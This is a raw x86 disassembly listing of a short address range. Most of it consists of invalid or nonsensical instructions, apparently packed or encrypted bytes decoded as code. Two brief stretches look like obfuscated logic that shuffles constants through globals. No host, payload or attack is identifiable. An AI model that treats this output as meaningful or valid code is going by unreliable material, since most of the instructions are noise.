  4097f7:	or     BYTE PTR [ebp+0xe],0x1b
  4097fb:	sbb    bh,dh
  4097fd:	into   
  4097fe:	test   eax,0xb8b99bc0
  409803:	lea    esp,[edx]
  409805:	nop
  409806:	retf   0xb087
  409809:	cmp    DWORD PTR [edi+0x1d],0xbe42eb77
  409810:	sbb    DWORD PTR [edx],edi
  409812:	call   0xdcbc228
  409817:	sub    ch,bh
  409819:	or     DWORD PTR [ebp+0x27],0x3fb8add7
  409820:	ss jmp 0x2824:0xe259bfc9
  409828:	sbb    eax,0x99ae3074
  40982d:	rol    BYTE PTR [edx],cl
  40982f:	cld    
  409830:	pop    ecx
  409831:	pop    ds
  409832:	cwde   
  409833:	mov    edi,0x53561c1e
  409838:	test   DWORD PTR [edi],edx
  40983a:	outs   dx,BYTE PTR ds:[esi]
  40983b:	sbb    eax,0x7035385a
  409840:	xchg   ecx,edx
  409842:	cdq    
  409843:	inc    eax
  409844:	repz dec edi
  409846:	aad    0x68
  409848:	adc    BYTE PTR [eax-0x72],dh
  40984b:	hlt    
  40984c:	inc    esi
  40984d:	fnsave [ecx-0x4226f88a]
  409853:	and    BYTE PTR [esp+ebx*1],0x50
  409857:	imul   eax,DWORD PTR [ebx+0x5c],0x30
  40985b:	add    al,0xe1
  40985d:	neg    DWORD PTR ds:0x9671a357
  409863:	jge    0x4097ef
  409865:	sti    
  409866:	xor    ecx,DWORD PTR [ecx+ebx*8-0x4d]
  40986a:	cmp    eax,0x3c50093
  40986f:	mov    cl,0x24
  409871:	xor    eax,0x8f0b1253
  409876:	das    
  409877:	(bad)  
  409878:	aad    0xa
  40987a:	outs   dx,DWORD PTR ds:[esi]
  40987b:	(bad)  
  40987c:	xchg   bh,dh
  40987e:	dec    esi
  40987f:	xchg   esp,eax
  409880:	mov    esp,0x3f53a1c2
  409885:	dec    edi
  409886:	stc    
  409887:	jge    0x409816
  409889:	add    al,0xde
  40988b:	inc    DWORD PTR [eax+0x40ae210]
  409891:	push   esp
  409892:	dec    edx
  409893:	lods   al,BYTE PTR ds:[esi]
  409894:	std    
  409895:	rcl    BYTE PTR [esi],1
  409897:	jl     0x40982b
  409899:	(bad)  
  40989a:	pushf  
  40989b:	push   esp
  40989c:	stos   DWORD PTR es:[edi],eax
  40989d:	mov    eax,ds:0xed18098b
  4098a2:	mov    eax,0xd37ae9d6
  4098a7:	ror    BYTE PTR [edi-0x20b12cc],cl
  4098ad:	adc    al,0xdc
  4098af:	das    
  4098b0:	js     0x409872
  4098b2:	scas   eax,DWORD PTR es:[edi]
  4098b3:	je     0x409837
  4098b5:	inc    ebx
  4098b6:	cmc    
  4098b7:	mov    eax,0xdbb0c6e1
  4098bc:	and    ecx,DWORD PTR [ecx-0x54]
  4098bf:	test   al,0xd6
  4098c1:	out    dx,eax
  4098c2:	mov    ch,0x66
  4098c4:	jg     0x409932
  4098c6:	fnstenv [esp+eiz*4-0x3872f853]
  4098cd:	jge    0x4098b8
  4098cf:	mov    esi,edx
  4098d1:	mov    ds:0xa91a2a9b,eax
  4098d6:	std    
  4098d7:	bound  esi,QWORD PTR [edi+esi*8-0x216e6cdc]
  4098de:	cmp    eax,0x661e3a57
  4098e3:	sti    
  4098e4:	push   si
  4098e6:	sar    BYTE PTR [ebp-0x6246cf2f],1
  4098ec:	adc    DWORD PTR [ecx-0xa],ebp
  4098ef:	jmp    0x262b:0x4be89016
  4098f6:	ret    
  4098f7:	sbb    DWORD PTR [ecx+0x54],ebx
  4098fa:	and    BYTE PTR [ecx+0x7678fbb6],cl
  409900:	add    BYTE PTR [ebx],0x8b
  409903:	mov    cl,0x5e
  409905:	and    edx,esp
  409907:	mov    dl,BYTE PTR [eax]
  409909:	cmp    eax,0x57f11423
  40990e:	sbb    ah,ah
  409910:	retf   
  409911:	into   
  409912:	jo     0x4098f2
  409914:	fdivr  QWORD PTR [ebp+0x5af52161]
  40991a:	push   ebx
  40991b:	lahf   
  40991c:	aaa    
  40991d:	jmp    0x35d1:0xee2a225c
  409924:	jb     0x4098be
  409926:	cmp    DWORD PTR [edi-0xc],0x1d8361ea
  40992d:	cli    
  40992e:	fidiv  WORD PTR [ebx]
  409930:	out    0x6c,eax
  409932:	cmp    DWORD PTR [edx+0x6abb461e],edx
  409938:	adc    ch,BYTE PTR [edi-0x62]
  40993b:	mul    BYTE PTR [edi+0x21b8a6ad]
  409941:	push   ds
  409942:	and    cl,BYTE PTR [esi]
  409944:	ret    0xe25e
  409947:	(bad)  
  409948:	xchg   edx,eax
  409949:	push   DWORD PTR [edi]
  40994b:	int3   
  40994c:	mov    ebx,0x78fef13c
  409951:	les    esp,FWORD PTR [edi-0x66]
  409954:	fsubr  st(0),st
  409956:	jne    0x40993f
  409958:	fadd   QWORD PTR [ecx]
  40995a:	mov    ah,BYTE PTR ds:[eax-0x37]
  40995e:	or     DWORD PTR [eax+ecx*8-0x78ddd5fb],ebp
  409965:	sub    dh,dh
  409967:	mov    ch,BYTE PTR [edi-0x4e]
  40996a:	sub    BYTE PTR [edx+0x27],0x77
  40996e:	mov    bh,0xe2
  409970:	mov    edi,0x595816a6
  409975:	sbb    BYTE PTR ds:0xb5695515,dl
  40997b:	xor    eax,0x24f5e231
  409980:	xchg   edi,eax
  409981:	cs int3 
  409983:	push   ss
  409984:	shl    BYTE PTR [edi],0x97
  409987:	mov    bh,BYTE PTR es:[esi+0x22]
  40998b:	dec    eax
  40998c:	jb     0x4099fb
  40998e:	or     ch,bh
  409990:	inc    esi
  409991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409992:	std    
  409993:	jb     0x4099ae
  409995:	das    
  409996:	(bad)  
  409997:	cli    
  409998:	add    eax,0xd2410f59
  40999d:	in     al,dx
  40999e:	sub    BYTE PTR [esi+0x7c3b8d0e],dh
  4099a4:	rcr    BYTE PTR [ebx],0x35
  4099a7:	je     0x40996d
  4099a9:	jmp    0xb73f:0x3de343aa
  4099b0:	int    0x9f
  4099b2:	cmp    al,0xe6
  4099b4:	in     al,0x80
  4099b6:	pop    ebp
  4099b7:	jns    0x409979
  4099b9:	mov    esp,0x354e45cb
  4099be:	(bad)  
  4099bf:	pop    ebp
  4099c0:	xchg   edi,eax
  4099c1:	(bad)  
  4099c2:	mov    bl,0xcd
  4099c4:	into   
  4099c5:	push   ecx
  4099c6:	mov    DWORD PTR ds:0x42a875,edx
  4099cc:	push   ecx
  4099cd:	mov    eax,0x5a3fc9f
  4099d2:	mov    DWORD PTR ds:0x42a885,0x49fb
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a875,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a7f9,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a779
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx-0x4713eb31]
  409a19:	cmp    al,0x9c
  409a1b:	jp     0x4099d3
  409a1d:	idiv   DWORD PTR [eax+0x78]
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x4099c6
  409a25:	lods   al,BYTE PTR ds:[esi]
  409a26:	call   0xc033:0xcfd24393
  409a2d:	xchg   ebp,eax
  409a2e:	rcr    DWORD PTR [eax+0x428a1b02],cl
  409a34:	scas   eax,DWORD PTR es:[edi]
  409a35:	push   ss
  409a36:	ss pop ds
  409a38:	xchg   edx,eax
  409a39:	sahf   
  409a3a:	cmp    al,0xd5
  409a3c:	ins    DWORD PTR es:[edi],dx
  409a3d:	(bad)  
  409a3e:	clc    
  409a3f:	jno    0x409aa5
  409a41:	test   al,0xb9
  409a43:	inc    eax
  409a44:	ret    0xc7c9
  409a47:	pop    ebx
  409a48:	imul   esi,DWORD PTR [eax+eiz*1-0x2],0x968c5d53
  409a50:	test   ah,bh
  409a52:	jns    0x409a61
  409a54:	icebp  
  409a55:	mov    ebp,0xbe7ee28
  409a5a:	in     al,0xd0
  409a5c:	push   ecx
  409a5d:	fild   DWORD PTR [esi]
  409a5f:	sbb    eax,0xb1f93a14
  409a64:	mov    ebp,0x8da258d4
  409a69:	rcl    DWORD PTR [ebx+0x2487e898],cl
  409a6f:	xchg   ecx,eax
  409a70:	pop    ss
  409a71:	mov    ebx,0xa0f93bfd
  409a76:	jmp    0x344f2fe8
  409a7b:	mov    edi,DWORD PTR [ebx+0x78c774c7]
  409a81:	into   
  409a82:	aas    
  409a83:	lock scas al,BYTE PTR es:[edi]
  409a85:	shr    cl,0xc3
  409a88:	add    DWORD PTR [edi],esp
  409a8a:	or     eax,DWORD PTR [ebp-0x38b1cbe8]
  409a90:	cmp    DWORD PTR [esi+0x30],ebx
  409a93:	or     edx,DWORD PTR [ebx-0xb]
  409a96:	inc    ecx
  409a97:	xor    DWORD PTR [ebx+0x54],edi
  409a9a:	in     al,dx
  409a9b:	pop    ebx
  409a9c:	imul   DWORD PTR [edx+0x1d]
  409a9f:	pop    esp
  409aa0:	or     BYTE PTR [ebx+eiz*8-0x43],cl
  409aa4:	jae    0x409ac5
  409aa6:	fnsave [eax+0x42]
  409aa9:	ins    DWORD PTR es:[edi],dx
  409aaa:	adc    DWORD PTR [ecx],0xffffffcc
  409aad:	xor    dh,BYTE PTR [edx+0x375d8aff]
  409ab3:	frstor [esi-0x45df149f]
  409ab9:	gs pusha 
  409abb:	cmc    
  409abc:	jmp    0x409af6
  409abe:	pop    ds
  409abf:	mov    ecx,edi
  409ac1:	nop
  409ac2:	cmp    edi,DWORD PTR [ecx+0x1d]
  409ac5:	cmp    esi,DWORD PTR [edi-0x24950f4c]
  409acb:	xchg   esi,eax
  409acc:	and    eax,0x5c5c9798
  409ad1:	fistp  DWORD PTR [esi-0x5233dc86]
  409ad7:	fwait
  409ad8:	push   ebp
  409ad9:	or     DWORD PTR [ebx+0x7],ecx
  409adc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409add:	mov    ah,0xe4
  409adf:	cmp    al,0xef
  409ae1:	cld    
  409ae2:	ds cmp edi,ecx
  409ae5:	mov    DWORD PTR [esi],edi
  409ae7:	jle    0x409a7e
  409ae9:	push   ss
  409aea:	je     0x409aec
  409aec:	imul   ebx,DWORD PTR [ebp-0x6b],0xc76479d2
  409af3:	jne    0x409af0
  409af5:	jnp    0x409afa
  409af7:	xchg   esi,eax
  409af8:	outs   dx,BYTE PTR ds:[esi]
  409af9:	mov    cl,0x4e
  409afb:	stos   DWORD PTR es:[edi],eax
  409afc:	enter  0x284b,0x66
  409b00:	inc    edx
  409b01:	push   ds
  409b02:	sbb    ch,bl
  409b04:	push   edx
  409b05:	(bad)
  409b08:	mov    bl,cl
  409b0a:	xor    ch,BYTE PTR [edx+esi*8+0x5953b16d]
  409b11:	mov    edi,0xfd6e1180
  409b16:	cmp    bl,BYTE PTR [edx]
  409b18:	mov    bh,0x90
  409b1a:	mov    ecx,DWORD PTR [eax-0x25]
  409b1d:	cmp    esp,DWORD PTR [edi+0x72]
  409b20:	mov    dh,0x8e
  409b22:	pop    edx
  409b23:	imul   edi,DWORD PTR [ebx],0xffffffd6
  409b26:	add    ah,ah
  409b28:	mov    dl,0x49
  409b2a:	fst    DWORD PTR [eax+edi*8+0x59]
  409b2e:	xor    eax,0x6fa9e149
  409b33:	rcl    DWORD PTR [edi+eiz*8-0x4cc3be23],cl
  409b3a:	iret   
  409b3b:	cmp    edi,ecx
  409b3d:	mov    gs,WORD PTR ds:0x3a36564f
  409b43:	test   BYTE PTR [ebp-0x2c],0x18
  409b47:	clc    
  409b48:	dec    edx
  409b49:	fwait
  409b4a:	sbb    esi,esp
  409b4c:	pop    ecx
  409b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b4e:	test   BYTE PTR [ecx+0x3c],bh
  409b51:	pop    esi
  409b52:	lock sub eax,0x6afec8bc
  409b58:	jge    0x409b0a
  409b5a:	cmp    ch,ch
  409b5c:	mov    ds:0xe61ca58e,al
  409b61:	(bad)
  409b64:	dec    eax
  409b65:	sbb    ah,BYTE PTR [eax]
  409b67:	sbb    dl,BYTE PTR [ecx-0x3]
  409b6a:	lahf   
  409b6b:	jecxz  0x409be4
  409b6d:	nop
  409b6e:	add    esp,DWORD PTR [ebx+0x12]
  409b71:	mov    eax,ds:0xfde4a6b0
  409b76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b77:	ins    BYTE PTR es:[edi],dx
  409b78:	test   al,0xa0
  409b7a:	xchg   DWORD PTR [edi-0x3118bdd9],esi
  409b80:	mov    esp,0x67ac424f
  409b85:	pop    ebx
  409b86:	call   0x24631c1d
  409b8b:	pop    ecx
  409b8c:	adc    DWORD PTR [esi-0x37],eax
  409b8f:	popa   
  409b90:	out    0x44,eax
  409b92:	repnz popf 
  409b94:	dec    ebx
  409b95:	enter  0xe921,0xb4
  409b99:	sub    DWORD PTR [ebp+0x61219ce4],ecx
  409b9f:	push   0xffffffcf
  409ba1:	rol    BYTE PTR [ecx],cl
  409ba3:	repnz loope 0x409bb7
  409ba6:	inc    ebx
  409ba7:	pop    esp
  409ba8:	in     eax,0xbb
  409baa:	lds    eax,FWORD PTR [edx-0x17]
  409bad:	cmp    DWORD PTR [edi],0xffffff8b
  409bb0:	and    DWORD PTR [eax-0x10ade00],edi
  409bb6:	sbb    BYTE PTR [ebx+0x7ca85a30],dh
  409bbc:	dec    esi
  409bbd:	ret    
  409bbe:	adc    esi,DWORD PTR [eax]
  409bc0:	xchg   esi,eax
  409bc1:	into   
  409bc2:	mov    edx,0x948e3c04
  409bc7:	cmp    eax,0x777c9bc7
  409bcc:	xchg   edi,eax
  409bcd:	fidiv  DWORD PTR [esi+0x264645eb]
  409bd3:	pop    eax
  409bd4:	sbb    DWORD PTR [edx+0x242cb3d8],edx
  409bda:	push   0x9
  409bdc:	jnp    0x409b77
  409bde:	xchg   esi,eax
  409bdf:	fsubrp st(4),st
  409be1:	push   0xffffffd7
  409be3:	adc    BYTE PTR [ecx],ah
  409be5:	mov    eax,ebx
  409be7:	pop    edi
  409be8:	xor    eax,0xd05d6e83
  409bed:	dec    edx
  409bee:	mov    ebx,0xa60bb9fc
  409bf3:	sub    esp,edi
  409bf5:	fisubr DWORD PTR [ecx]
  409bf7:	sub    al,0x21
  409bf9:	or     dh,BYTE PTR [ecx]
  409bfb:	jge    0x409beb
  409bfd:	pop    ds
  409bfe:	clc    
  409bff:	dec    esp
  409c00:	mov    al,0x50
  409c02:	idiv   ch
  409c04:	cmp    cl,BYTE PTR [edi+0x51771d1d]
  409c0a:	cli    
  409c0b:	test   eax,0x5d387be0
  409c10:	push   0x68
  409c12:	mov    cl,0x2f
  409c14:	jl     0x409c6b
  409c16:	(bad)  
  409c17:	cld    
  409c18:	inc    edi
  409c19:	js     0x409c81
  409c1b:	scas   eax,DWORD PTR es:[edi]
  409c1c:	mov    esp,0x1b9edf9f
  409c21:	mov    bl,0x75
  409c23:	imul   ebx,DWORD PTR [eax-0x1d],0xffffffb9
  409c27:	(bad)  
  409c28:	daa    
  409c29:	scas   al,BYTE PTR es:[edi]
  409c2a:	xor    BYTE PTR [ebx+0x235dae70],dl
  409c30:	adc    BYTE PTR [ecx+ecx*4],al
  409c33:	fwait
  409c34:	cdq    
  409c35:	xchg   ebp,eax
  409c36:	or     cl,BYTE PTR [edi]
  409c38:	pop    ss
  409c39:	xor    al,0xcd
  409c3b:	ret    0x131e
  409c3e:	adc    DWORD PTR [esi+0x25ec5294],esi
  409c44:	(bad)  
  409c45:	mov    eax,ds:0x12baaf6a
  409c4a:	(bad)  [esi+0x76]
  409c4d:	and    al,0x50
  409c4f:	(bad)  
  409c50:	fsubrp st(6),st
  409c52:	pop    esi
  409c53:	test   DWORD PTR [eax],ecx
  409c55:	xor    ch,BYTE PTR [eax-0x7fcb05d6]
  409c5b:	imul   esi,DWORD PTR [ecx+0x645a12c0],0xffffffb7
  409c62:	sbb    al,BYTE PTR [edx+0x4523760a]
  409c68:	in     al,0x94
  409c6a:	add    BYTE PTR [eax+0x7f],dl
  409c6d:	and    BYTE PTR [ebx+ecx*2-0x2c],dl
  409c71:	pop    ss
  409c72:	inc    esi
  409c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c74:	inc    edx
  409c75:	sbb    BYTE PTR [edx+edx*4+0x14],dh
  409c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c7a:	aaa    
  409c7b:	pushf  
  409c7c:	popf   
  409c7d:	pushf  
  409c7e:	lods   al,BYTE PTR ds:[esi]
  409c7f:	sbb    eax,0xc8e5aabb
  409c84:	xor    BYTE PTR [eax],cl
  409c86:	adc    ecx,DWORD PTR [ebp+0x58ac015a]
  409c8c:	in     al,0x64
  409c8e:	sbb    esp,ecx
  409c90:	cmp    DWORD PTR [ecx],ecx
  409c92:	aad    0xff
  409c94:	cmp    al,0xd4
  409c96:	ror    ch,0xaf
  409c99:	add    DWORD PTR ds:0x50a5f605,ebp
  409c9f:	push   ss
  409ca0:	popf   
  409ca1:	and    eax,0xf0ed95aa
  409ca6:	mov    ds:0x75c3d98a,al
  409cab:	(bad)  
  409cac:	out    0xb9,eax
  409cae:	in     eax,0x9f
  409cb0:	pop    esi
  409cb1:	ja     0x409ca3
  409cb3:	(bad)  
  409cb4:	les    ebx,FWORD PTR [ebp+esi*4-0x6]
  409cb8:	lods   al,BYTE PTR ds:[esi]
  409cb9:	mov    ecx,0xd081b6f0
  409cbe:	push   ss
  409cbf:	pop    ebx
  409cc0:	das    
  409cc1:	mov    WORD PTR [esi],fs
  409cc3:	and    ch,dl
  409cc5:	xor    ch,BYTE PTR [edx+eiz*8-0xc]
  409cc9:	xchg   ah,bh
  409ccb:	out    0xe3,al
  409ccd:	adc    ebx,DWORD PTR [ebx-0xaf76f7b]
  409cd3:	dec    ecx
  409cd4:	lds    eax,FWORD PTR [edx-0x7e]
  409cd7:	lods   al,BYTE PTR ds:[esi]
  409cd8:	push   esp
  409cd9:	std    
  409cda:	jno    0x409d45
  409cdc:	aaa    
  409cdd:	pop    es
  409cde:	mov    edi,0x333659f3
  409ce3:	cli    
  409ce4:	mov    eax,ds:0x1670b327
  409ce9:	lock ins BYTE PTR es:[edi],dx
  409ceb:	dec    ebp
  409cec:	lea    eax,[ebx-0x263b9598]
  409cf2:	stc    
  409cf3:	xlat   BYTE PTR ds:[ebx]
  409cf4:	push   ss
  409cf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cf6:	sar    DWORD PTR [eax-0x7d],1
  409cf9:	pushf  
  409cfa:	mov    ax,WORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42a779,0x42a805
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a77d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a841,0x42a83d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a831,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi-0x27407d6d],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409dba
  409d66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d67:	sar    DWORD PTR [ebx],1
  409d69:	dec    esi
  409d6a:	test   BYTE PTR [edi],bl
  409d6c:	and    esi,DWORD PTR [edi]
  409d6e:	mov    ds:0x5bb678d6,al
  409d73:	daa    
  409d74:	loop   0x409de1
  409d76:	(bad)  
  409d77:	dec    esi
  409d78:	mov    ah,0x62
  409d7a:	cmc    
  409d7b:	rcr    edx,cl
  409d7d:	xchg   esi,eax
  409d7e:	int3   
  409d7f:	pop    es
  409d80:	jmp    0x7cb4269e
  409d85:	sub    cl,cl
  409d87:	mov    ah,0xc3
  409d89:	cli    
  409d8a:	push   ss
  409d8b:	jmp    0xa8e4:0xd3b884ff
  409d92:	inc    bx
  409d94:	or     DWORD PTR [esi+0x73],edx
  409d97:	pop    edi
  409d98:	inc    esi
  409d99:	cmp    BYTE PTR [eax],al
  409d9b:	mov    bh,0x21
  409d9d:	sub    BYTE PTR [ebx+0xfe35043],0xb8
  409da4:	mov    edx,0xd067d8ca
  409da9:	mov    BYTE PTR [esi],ch
  409dab:	fimul  DWORD PTR [eax-0x2b]
  409dae:	pop    ss
  409daf:	pop    es
  409db0:	sub    al,0x57
  409db2:	mov    ch,0xcf
  409db4:	stos   BYTE PTR es:[edi],al
  409db5:	cmp    eax,0x91247714
  409dba:	xor    al,0xf8
  409dbc:	jg     0x409dfc
  409dbe:	jo     0x409d89
  409dc0:	jne    0x409e33
  409dc2:	inc    edx
  409dc3:	ret    0x93c3
  409dc6:	call   0xd2ee022c
  409dcb:	inc    esi
  409dcc:	inc    eax
  409dcd:	xchg   ecx,eax
  409dce:	mov    edi,eax
  409dd0:	adc    DWORD PTR [eax+0x44],ecx
  409dd3:	fwait
  409dd4:	and    dl,al
  409dd6:	icebp  
  409dd7:	cmp    DWORD PTR [esi-0x3784861c],0xe2e77375
  409de1:	push   edx
  409de2:	fnstsw WORD PTR [eax-0x463b3217]
  409de8:	hlt    
  409de9:	cs push 0xa6773cee
  409def:	das    
  409df0:	jp     0x409e40
  409df2:	mov    esp,0xf5124133
  409df7:	jb     0x409e4d
  409df9:	shl    BYTE PTR [ecx+0x33],1
  409dfc:	js     0x409e61
  409dfe:	fwait
  409dff:	outs   dx,BYTE PTR ds:[esi]
  409e00:	out    dx,eax
  409e01:	test   DWORD PTR [eax],esi
  409e03:	mov    ebp,0x668575a5
  409e08:	das    
  409e09:	test   al,0x50
  409e0b:	arpl   WORD PTR [edi+0xc65c950],dx
  409e11:	and    bh,BYTE PTR [eax-0x6f]
  409e14:	sub    cl,BYTE PTR ds:0x7e251c22
  409e1a:	mov    cl,0xe7
  409e1c:	mov    WORD PTR [ebp+0x21],cs
  409e1f:	std    
  409e20:	xchg   BYTE PTR [ebx+0x1d],ah
  409e23:	(bad)  
  409e25:	mov    bl,0xd3
  409e27:	dec    esi
  409e28:	xchg   DWORD PTR [eax],esi
  409e2a:	pop    ebx
  409e2b:	inc    edx
  409e2c:	cmp    al,0x83
  409e2e:	test   DWORD PTR ss:[eax*8-0x70164e],esi
  409e36:	loope  0x409dbf
  409e38:	add    BYTE PTR [ecx],0x97
  409e3b:	mov    eax,ds:0xf66f021d
  409e40:	add    DWORD PTR [edi+edi*4],ecx
  409e43:	and    ch,dl
  409e45:	data16 jecxz 0x409e31
  409e48:	popa   
  409e49:	mov    WORD PTR [eax+0x27c318e2],?
  409e4f:	mov    cl,0x30
  409e51:	in     eax,0x8c
  409e53:	jmp    0x409e5f
  409e55:	inc    esi
  409e56:	popa   
  409e57:	pop    ebx
  409e58:	outs   dx,DWORD PTR ds:[esi]
  409e59:	ret    0xcb04
  409e5c:	shr    BYTE PTR [esi-0x64],1
  409e5f:	xor    edx,esp
  409e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e62:	cmp    ecx,DWORD PTR [esi+eiz*4+0x6d]
  409e66:	ror    cl,1
  409e68:	or     esp,DWORD PTR [ecx-0x4f]
  409e6b:	lock adc dl,bh
  409e6e:	cmp    ecx,ebx
  409e70:	or     bh,bh
  409e72:	ret    
  409e73:	xchg   esi,eax
  409e74:	js     0x409e97
  409e76:	mov    esp,0x8e6e2ce1
  409e7b:	stos   DWORD PTR es:[edi],eax
  409e7c:	pop    ecx
  409e7d:	imul   esi,DWORD PTR [esi-0x5e681fb9],0xffffffc8
  409e84:	jecxz  0x409e51
  409e86:	jae    0x409efd
  409e88:	outs   dx,DWORD PTR ds:[esi]
  409e89:	jae    0x409e0e
  409e8b:	retf   0xe923
  409e8e:	rol    dh,0x26
  409e91:	add    BYTE PTR [edi],bh
  409e93:	pop    ds
  409e94:	push   edi
  409e95:	fmul   st,st(0)
  409e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e98:	xchg   BYTE PTR [ebx+0x326a4040],al
  409e9e:	int3   
  409e9f:	repnz sub edx,ecx
  409ea2:	inc    ebx
  409ea3:	cmc    
  409ea4:	jae    0x409e78
  409ea6:	and    bh,BYTE PTR [ecx-0x3a]
  409ea9:	icebp  
  409eaa:	jl     0x409e66
  409eac:	fadd   DWORD PTR [esi+0x66c8dfd9]
  409eb2:	xchg   edi,eax
  409eb3:	pop    ebp
  409eb4:	gs inc edi
  409eb6:	xor    ebx,DWORD PTR [ebx]
  409eb8:	sub    eax,0xf6ebf623
  409ebd:	and    ebx,ebp
  409ebf:	push   edi
  409ec0:	shr    dh,1
  409ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ec3:	push   ss
  409ec4:	mov    dh,0x53
  409ec6:	dec    esi
  409ec7:	sub    edi,eax
  409ec9:	adc    al,0x9f
  409ecb:	out    dx,eax
  409ecc:	mov    bh,0xa7
  409ece:	test   eax,0xb8ed255
  409ed3:	sub    al,0x17
  409ed5:	push   ds
  409ed6:	imul   esi,DWORD PTR [ebx-0x73b34aa],0x6f0b2818
  409ee0:	in     eax,dx
  409ee1:	dec    esi
  409ee3:	sub    DWORD PTR [eax],esi
  409ee5:	and    edi,ebp
  409ee7:	inc    ebx
  409ee8:	pop    eax
  409ee9:	clc    
  409eea:	cmp    al,0x7e
  409eec:	xchg   esp,eax
  409eed:	mov    bl,0xd5
  409eef:	pop    es
  409ef0:	lds    eax,FWORD PTR [esi]
  409ef2:	push   edi
  409ef3:	adc    al,0x15
  409ef5:	stos   BYTE PTR es:[edi],al
  409ef6:	mov    bl,0x18
  409ef8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ef9:	add    ch,ah
  409efb:	push   ds
  409efc:	inc    di
  409efe:	aam    0xb9
  409f00:	inc    esi
  409f01:	xor    ch,0x78
  409f04:	or     eax,0x4ea465e6
  409f09:	push   cs
  409f0a:	loop   0x409f76
  409f0c:	mov    edx,cr3
  409f0f:	xchg   ebp,eax
  409f10:	dec    ecx
  409f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f12:	jl     0x409ee4
  409f14:	out    dx,eax
  409f15:	scas   eax,DWORD PTR es:[edi]
  409f16:	push   edi
  409f17:	push   esi
  409f18:	std    
  409f19:	in     eax,dx
  409f1a:	mov    BYTE PTR [edi+0x9],ah
  409f1d:	ds into 
  409f1f:	or     DWORD PTR [edx+0x6e1f0148],esi
  409f25:	push   eax
  409f26:	add    DWORD PTR [eax-0x7a7d1c83],ecx
  409f2c:	xchg   esi,eax
  409f2d:	test   al,0x57
  409f30:	cmp    DWORD PTR [ebx+0x2a],0x4b
  409f34:	lods   al,BYTE PTR ds:[esi]
  409f35:	dec    ecx
  409f36:	in     eax,dx
  409f37:	xor    al,0xb7
  409f39:	mov    ds:0x9d363c1a,eax
  409f3e:	mov    esi,0xa647190f
  409f43:	mov    dh,0x4d
  409f45:	xchg   eax,esp
  409f47:	mov    ch,0x7c
  409f49:	sahf   
  409f4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f4b:	mov    ds:0x16118254,al
  409f50:	stc    
  409f51:	xchg   esi,eax
  409f52:	adc    al,0xb2
  409f54:	jmp    0x55cf:0x3a64faa5
  409f5b:	stc    
  409f5c:	cmp    bl,BYTE PTR [edx+0xb5b9f03]
  409f62:	inc    edi
  409f63:	and    ebp,esi
  409f65:	cmc    
  409f66:	dec    esp
  409f67:	outs   dx,BYTE PTR ds:[esi]
  409f68:	(bad)  
  409f69:	fldcw  WORD PTR [ebx-0x30]
  409f6c:	loope  0x409fe0
  409f6e:	adc    al,BYTE PTR [ebx+0x377e35ff]
  409f74:	mov    esi,0x810f7a2c
  409f79:	mov    esp,0xe3246999
  409f7e:	push   0x803c8c
  409f83:	mov    eax,ds:0x62d6f9a0
  409f88:	mov    cl,0x31
  409f8a:	push   es
  409f8b:	dec    ebp
  409f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f8d:	out    0x46,al
  409f8f:	jbe    0x409fff
  409f91:	jb     0x409f44
  409f93:	dec    ecx
  409f94:	mov    eax,0x26d605c6
  409f99:	pop    es
  409f9a:	pop    eax
  409f9b:	pusha  
  409f9c:	test   al,0x9d
  409f9e:	pop    esp
  409f9f:	in     eax,dx
  409fa0:	dec    esp
  409fa1:	fadd   st,st(6)
  409fa3:	test   BYTE PTR [eax-0x7b45cd8b],dh
  409fa9:	std    
  409faa:	pop    es
  409fab:	add    ebx,DWORD PTR [eax]
  409fad:	jecxz  0x409f35
  409faf:	or     DWORD PTR [eax],esp
  409fb1:	mov    ecx,0x5adabf42
  409fb6:	repz xor eax,0x669ed807
  409fbc:	rol    DWORD PTR [ebx],1
  409fbe:	sub    ecx,esp
  409fc0:	sbb    DWORD PTR [edx+ebx*1-0x19],ecx
  409fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fc5:	mov    dh,0x34
